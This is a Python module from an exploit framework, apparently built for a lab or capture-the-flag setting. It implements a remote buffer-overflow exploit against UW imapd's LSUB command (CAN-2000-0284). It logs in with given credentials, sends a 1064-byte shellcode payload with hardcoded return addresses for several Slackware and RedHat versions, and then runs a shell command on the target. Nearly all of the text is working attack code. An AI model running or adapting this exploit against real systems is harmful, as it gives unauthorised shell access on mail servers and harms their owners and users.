import time

from interfaces.hasparameters import StringParam
from interfaces.hasparameters import KeyListParam
import managers.imap as imap
import managers.egg as egg

from interfaces.exploit import RES_OK
from interfaces.exploit import RES_FAIL
from interfaces.exploit import Exploit
from interfaces.exploit import ServiceDown
from interfaces.exploit import ExploitError


desc =	''' 
<br>
<hr><center><big><b>
Imapd lsub 
</b></big></center><hr>
<br>
<b>Vulnerability:</b><hr>		
Univ. Of Washington imapd Remote Buffer Overflow Vulnerabilities
<br><br>
A buffer overflow exists in imapd. The vulnerability exists in the LIST, COPY,
LSUB, RENAME, and FIND command. By supplying a long, well-crafted string as 
argument to the these commands, it becomes possible to execute code on the machine.<br>
All of these commmand require an account on the machine.
In addition, privileges have been dropped in imapd prior to the location of the
buffer overrun. As such, this vulnerability would only be useful in a scenario
where a user has an account, but no shell level access.
This would allow them to gain shell access.
<br><br>
<b>References</b><hr>
CVE: CAN-2000-0284<br>
BugtraqId: 1110<br>
<br>
<b>Attack Details</b><hr>
Exploit for IMAP4rev1 v12.261, v12.264 and 2000.284<br>
The original exploit was developed by SkyLaZarT - www.BufferOverflow.org

<br><br><br>
'''

target_platform = [
 "Slackware 7.0 - IMAP4rev1 v12.261",
 "Slackware 7.1 - IMAP4rev1 v12.264",
 "RedHat    6.2(ZooT) - IMAP4rev1 v12.264",
 "Slackware 7.0 - IMAP4rev1 2000.284"
]

class ImapLSUB(Exploit):
	
	SIZE 	  = 1064
	
	def __init__(self):
		Exploit.__init__(self,'Wu-imapd lsub bo', desc)
		self.add_param(StringParam('USER','foo', 'A valid userid'))
		self.add_param(StringParam('PASSWD','bar', 'The password for the previous userid'))
		self.add_param(StringParam('RESULT','well done','The string that must be present in the result if the attack is successful'))
		self.add_param(StringParam('CMD','cat /flag.txt', 'The command to be executed on the remote host'))
		self.add_param(KeyListParam('PLATFORM',target_platform[2], target_platform, 'The target platform (used fot the return address)'))
		
		self.retaddr   = None
		self.eggm      = None
				
	def set_up(self):
		if self.PLATFORM == target_platform[0]:   self.retaddr = "\xec\xf3\xff\xbf"
		elif self.PLATFORM == target_platform[1]: self.retaddr = "\xe0\xf4\xff\xbf"
		elif self.PLATFORM == target_platform[2]: self.retaddr = "\x97\xf6\xff\xbf"
		elif self.PLATFORM == target_platform[3]: self.retaddr = "\xc8\xeb\xff\xbf"
		
		self.eggm = egg.EggManager(egg.aleph1,1064)
		self.eggm.append_ret(self.retaddr,25)
	
	def execute(self):
		self.res       = ''
		imapm = imap.IMAPManager()

		self.log.info("Connecting to the server...")

		if imapm.connect()==False:
			raise ServiceDown
		
		self.log.info("Sending login...")

		imapm.send_cmd('login %s %s'%(self.USER, self.PASSWD))
		
		resp = imapm.get_imap_response()
		
		if not ("OK LOGIN" in resp):
			self.log.error("Login failed!!")
			raise ExploitError, "Login failed"
	
		self.log.info("Logged-in.\nSending the shellcode...")
		
		imapm.send_cmd('lsub "" {1064}')
		resp = imapm.get_imap_response()
		self.log.info("Resp: %s"%resp)
				
		self.log.info("Sending shellcode...")
		imapm.send_raw(self.eggm.get_egg())
		imapm.send_raw("\n")
		imapm.send_raw("\n")
		time.sleep(2)
		
		self.log.info("Sending shell command: %s"%self.CMD)
		imapm.send_raw(self.CMD+"\n")
		self.res = imapm.sock.readline('\n',blocking=True)
		
		self.log.debug("Response:\r\n%r"%self.res)
		imapm.close()

	def isSuccessful(self):
		if self.RESULT in self.res:
			return RES_OK
		else:
			return RES_FAIL

